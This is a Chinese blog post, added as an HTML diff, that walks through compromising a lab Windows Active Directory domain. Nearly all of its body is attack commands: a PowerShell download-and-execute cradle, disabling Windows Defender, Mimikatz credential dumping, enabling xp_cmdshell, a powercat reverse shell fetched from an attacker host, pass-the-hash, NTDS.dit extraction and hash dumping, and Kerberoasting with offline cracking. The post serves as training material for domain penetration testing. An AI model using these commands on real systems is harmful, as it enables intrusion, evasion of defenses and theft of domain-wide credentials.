@@ -1,0 +1,1058 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="环境配置 123192.168.159.10(offensive-client/win10)192.168.159.20(offensive-sql-server/windows server 2016)  192.168.159.200(Domain Controller/windows server 2016)  账号信息 123Machine Offensive-User - Alice/P">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive域环境靶场渗透">
+<meta property="og:url" content="https://wh0ale.github.io/2019/12/16/Offensive域环境靶场渗透/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="环境配置 123192.168.159.10(offensive-client/win10)192.168.159.20(offensive-sql-server/windows server 2016)  192.168.159.200(Domain Controller/windows server 2016)  账号信息 123Machine Offensive-User - Alice/P">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-45-28.png">
+<meta property="og:updated_time" content="2019-12-18T08:21:11.457Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Offensive域环境靶场渗透">
+<meta name="twitter:description" content="环境配置 123192.168.159.10(offensive-client/win10)192.168.159.20(offensive-sql-server/windows server 2016)  192.168.159.200(Domain Controller/windows server 2016)  账号信息 123Machine Offensive-User - Alice/P">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-45-28.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/12/16/Offensive域环境靶场渗透/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Offensive域环境靶场渗透 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/12/16/Offensive域环境靶场渗透/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">Offensive域环境靶场渗透
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-16 17:59:19" itemprop="dateCreated datePublished" datetime="2019-12-16T17:59:19+08:00">2019-12-16</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-18 16:21:11" itemprop="dateModified" datetime="2019-12-18T16:21:11+08:00">2019-12-18</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">8.8k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">8 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2019-12-16_14-45-28.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.159.10(offensive-client/win10)</span><br><span class="line">192.168.159.20(offensive-sql-server/windows server 2016)  </span><br><span class="line">192.168.159.200(Domain Controller/windows server 2016)</span><br></pre></td></tr></table></figure>
+
+<p>账号信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Machine Offensive-User - Alice/Password1</span><br><span class="line">Machine Offensive-SQLServer1 - dbadmin:Password!</span><br><span class="line">Machine Offensive-DC - Administrator:Password@</span><br></pre></td></tr></table></figure>
+
+<p><strong>Powershell基础命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ep Bypass -nop -noexit -c iex ((New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′))</span><br></pre></td></tr></table></figure>
+
+<p>在没有默认PowerShell解释器的情况下运行脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe –ep Bypass “&amp; &#123;Get-Content .\malware.ps2 | iex&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试域关系</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-Credential </span><br><span class="line">Test-ComputerSecureChannel</span><br><span class="line">Test-ComputerSecureChannel -Server &quot;dc.offensive.local&quot;</span><br><span class="line">Test-ComputerSecureChannel -Repair</span><br><span class="line">Test-ComputerSecureChannel -verbose</span><br></pre></td></tr></table></figure>
+
+<h1 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h1><p>域中用户的当前权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;whoami</span><br><span class="line">C:\&gt; net localgroup administrators</span><br></pre></td></tr></table></figure>
+
+<p>导入PowerUp脚本以查找本地特权升级漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Powershell -ep bypass</span><br><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools</span><br><span class="line">PS C:\&gt;. .\Powerup.ps1</span><br><span class="line">PS C:\&gt;Invoke-AllChecks -verbose</span><br><span class="line">PS C:\&gt;Write-ServiceBinary -ServiceName VulnService -UserName &quot;offensive\alice&quot; -Password Passw0rd! //指定添加用户，用户密码以及添加的用户组</span><br><span class="line">PS C:\&gt;cp .\service.exe &quot;C:\Program Files\Vuln Service\VulnService.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>检查服务状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;sc qc VulnService</span><br></pre></td></tr></table></figure>
+
+<p>立即重新启动系统。</p>
+<h1 id="域枚举"><a href="#域枚举" class="headerlink" title="域枚举"></a>域枚举</h1><p>使用管理员权限打开Powershell并禁用Windows Defender</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Set-MpPreference -disablerealtimeMonitoring $true</span><br></pre></td></tr></table></figure>
+
+<p>加载Mimimikatz并从lsass进程中转储凭证。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools\mimikatz_trunk\x64</span><br><span class="line">PS C:\Users\alice\Desktop\tools\mimikatz_trunk\x64&gt;.\mimikatz.exe</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>导入<strong>PowerView</strong>进行域枚举。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools</span><br><span class="line">PS C:\&gt;. .\powerview.ps1</span><br></pre></td></tr></table></figure>
+
+<p>获取当前域和域控制器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Get-NetDomain</span><br><span class="line">PS C:\&gt;Get-NetDomainController</span><br></pre></td></tr></table></figure>
+
+<p>获取当前域中的用户列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Get-NetUser</span><br><span class="line">PS C:\&gt;Get-NetUser | select name</span><br></pre></td></tr></table></figure>
+
+<p>获取当前域中的所有组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Get-NetGroup</span><br><span class="line">PS C:\&gt;Get-NetGroup | select name</span><br><span class="line">PS C:\&gt;Get-NetGroup *admin* | select name</span><br><span class="line">PS C:\&gt;Get-NetGroup -UserName Alice</span><br><span class="line">PS C:\&gt;Get-NetGroup &quot;Domain Admins&quot;</span><br></pre></td></tr></table></figure>
+
+<p>获取当前域中的计算机列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Get-NetComputer</span><br><span class="line">PS C:\&gt;Get-NetComputer | select name</span><br></pre></td></tr></table></figure>
+
+<p>导入<strong>PowerUpSQL</strong> powershell脚本以枚举域中的sql server。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools\PowerUpSQL</span><br><span class="line">C:\Users\alice\Desktop\tools\PowerUpSQL&gt;. .\PowerUpSQL.ps1</span><br></pre></td></tr></table></figure>
+
+<p>发现SQL 实例并检查可访问性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools\PowerUpSQL&gt;Get-SQLInstanceDomain | Get-SQLConnectionTest</span><br></pre></td></tr></table></figure>
+
+<p>收集有关SQL实例的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools\PowerUpSQL&gt;Get-SQLServerInfo -Instance Offensive-SQL1</span><br></pre></td></tr></table></figure>
+
+<p>自动扫描SQL实例是否配置错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools\PowerUpSQL&gt;Invoke-SQLAudit -Instance Offensive-SQL1 -verbose</span><br></pre></td></tr></table></figure>
+
+<h1 id="管理员侦察"><a href="#管理员侦察" class="headerlink" title="管理员侦察"></a>管理员侦察</h1><p>查找当前域中用户具有本地管理员访问权限的所有计算机。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools&gt;. .\Powerview.ps1</span><br><span class="line">PS C:\Users\alice\Desktop\tools&gt;Find-LocalAdminAccess -verbose</span><br></pre></td></tr></table></figure>
+
+<p>查找域管理员或指定的用户/组具有会话的计算机。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Invoke-UserHunter -checkAccess -verbose</span><br></pre></td></tr></table></figure>
+
+<h1 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h1><p>打开HeidiSQL并使用Windows身份验证连接到Offensive-SQL1服务器。执行以下查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &apos;whoami&apos;</span><br></pre></td></tr></table></figure>
+
+<p>如果xp_cmdshell被禁用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1</span><br><span class="line">RECONFIGUREEXEC </span><br><span class="line">sp_configure &apos;xp_cmdshell&apos;,1</span><br><span class="line">RECONFIGUREEXEC master..xp_cmdshell &apos;whoami&apos;</span><br></pre></td></tr></table></figure>
+
+<p>启动将连接反向外壳的<strong>powercat</strong>侦听器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools</span><br><span class="line">PS C:\Users\alice\Desktop\tools&gt; . .\powercat.ps1</span><br><span class="line">PS C:\Users\alice\Desktop\tools&gt; powercat -l -v -p 443 -t 1000</span><br></pre></td></tr></table></figure>
+
+<p>使用hfs服务器托管反向Shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &apos;powershell &quot;iex(New-Object Net.WebClient).DownloadString(&apos;&apos;http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1&apos;&apos;)&quot;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>如果上述命令不起作用，请对反向外壳进行编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools&gt; . .\Invoke-Encode.ps1</span><br><span class="line">PS C:\Users\alice\Desktop\tools&gt; Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine_443.ps1 -OutCommand</span><br></pre></td></tr></table></figure>
+
+<p>机器上的当前登录用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt;whoami</span><br></pre></td></tr></table></figure>
+
+<p>禁用Windows Defender。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt;Set-MpPreference -disablerealtimeMonitoring $true</span><br></pre></td></tr></table></figure>
+
+<p>从受害机器上传输Mimikatz。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt;cd c:\</span><br><span class="line">PS C:\&gt;mkdir tempPS C:\&gt;cd temp</span><br><span class="line">PS C:\temp&gt;iwr -Uri http://192.168.159.10/mimikatz.exe -OutFile mimikatz.exe -UseBasicParsing</span><br><span class="line">PS C:\temp&gt; dir</span><br></pre></td></tr></table></figure>
+
+<p>加载Mimimikatz并从lsass进程中转储凭证。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\temp&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>在Alice（client）命令行上运行它。<code>Over Pass the hash</code>并根据哈希值生成令牌</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Alice\Desktop\tools\mimikatz_trunk\x64&gt; .\mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:powershell.exe</span><br></pre></td></tr></table></figure>
+
+<h1 id="域管理员权限"><a href="#域管理员权限" class="headerlink" title="域管理员权限"></a>域管理员权限</h1><p>在使用<code>dbadmin</code>标记执行的Spawn Powershell中输入powershell会话。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt;whoami</span><br><span class="line">PS C:\Windows\system32&gt;Enter-PSSession -ComputerName dc</span><br><span class="line">PS C:\Windows\system32&gt;Set-MpPreference -disablerealtimeMonitoring $true</span><br></pre></td></tr></table></figure>
+
+<p>转储Active Directory数据库（NTDS.dit）文件。将<strong>Ninjacopy Powershell</strong>脚本托管在hfs服务器上，并将其传输到域控制器上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt;iwr -Uri http://192.168.159.10/Invoke-NinjaCopy.ps1 -OutFile Invoke-NinjaCopy.ps1 -UseBasicParsing</span><br><span class="line">PS C:\Windows\system32&gt;. .\Invoke-NinjaCopy.ps1</span><br><span class="line">PS C:\Windows\system32&gt;Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -Verbose -LocalDestination &apos;C:\Users\dbadmin\Desktop\ntds.dit&apos;</span><br></pre></td></tr></table></figure>
+
+<p>保存系统文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt;reg save HKLM\SYSTEM C:\Users\dbadmin\Desktop\SYS</span><br></pre></td></tr></table></figure>
+
+<p>使用powershell <strong>copy-item</strong>命令在受害机器上传输ntds.dit和SYS文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;Copy-Item &apos;\\dc.offensive.local\C$\Users\dbadmin\Desktop\ntds.dit&apos;-Destination &apos;\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit&apos;</span><br><span class="line">PS C:\&gt;Copy-Item &apos;\\dc.offensive.local\C$\Users\dbadmin\Desktop\SYS&apos; -Destination &apos;\\Client1.offensive.local\C$\Users\alice\Desktop\tools\SYS&apos;</span><br></pre></td></tr></table></figure>
+
+<p>在受害者计算机上，执行以下命令以检索所有用户的NTLM哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools&gt;Get-BootKey -SystemHivePath &apos;SYS&apos;</span><br><span class="line">PS C:\Users\alice\Desktop\tools&gt;$key = Get-BootKey -SystemHivePath &apos;SYS&apos;</span><br><span class="line">PS C:\Users\alice\Desktop\tools&gt;Get-ADDBAccount -All -DBPath &apos;C:\Users\alice\Desktop\tools\ntds.dit&apos; -BootKey $key</span><br></pre></td></tr></table></figure>
+
+<p>使用Windows esentutl二进制文件修复ntds.dit文件并进行传输</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[dc.offensive.local]: PS C:\Users\dbadmin\Desktop&gt;esentutl.exe /p &apos;C:\Users\dbadmin\Desktop\ntds.dit&apos; /!10240 /8 /o</span><br><span class="line"></span><br><span class="line">[dc.offensive.local]: PS C:\Users\dbadmin\Desktop&gt;Copy-Item &apos;\\dc.offensive.local\C$\Users\dbadmin\Desktop\ntds.dit&apos;-Destination &apos;\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit&apos;</span><br></pre></td></tr></table></figure>
+
+<p>在受害计算机上，再次执行以下命令以检索所有用户的NTLM哈希。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools&gt;Get-ADDBAccount -All -DBPath &apos;C:\Users\alice\Desktop\tools\ntds.dit&apos; -BootKey $key</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>步骤1：在Active Directory中扫描设置了SPN值的用户帐户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools\kerberoast\kerberoast-master&gt;. .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
+
+<p>步骤2：使用SPN值从AD请求服务票证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools\kerberoast\kerberoast-master&gt;Add-Type –AssemblyName System.IdentityModel</span><br><span class="line">PS C:\Users\alice\Desktop\tools\kerberoast\kerberoast-master&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList &apos;MSSQLSvc/Offensive-SQL1:1433&apos;</span><br></pre></td></tr></table></figure>
+
+<p>步骤3：将服务票证提取到内存中并保存到文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt;cd C:\Users\alice\Desktop\tools\mimikatz_trunk\x64</span><br><span class="line">PS C:\Users\alice\Desktop\tools\mimikatz_trunk\x64&gt;.\mimikatz.exe</span><br><span class="line">mimikatz # kerberos::list /export</span><br></pre></td></tr></table></figure>
+
+<p>将票证复制到<code>C:\Users\alice\Desktop\tools\kerberoast\kerberoast-master</code>文件夹中</p>
+<p>步骤4：蛮力脱机攻击那些密码直到破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\alice\Desktop\tools\kerberoast\kerberoast-master&gt;python tgsrepcrack.py pass.txt &quot;copied-ticket-name.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>您现在应该拥有破解密码</p>
+<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p>使用Mimikatz命令<code>kerberos::golden</code>，传递域SID，目标主机名，服务名称，服务帐户的NTLM哈希，用户名和组信息，以创建Silver Ticket</p>
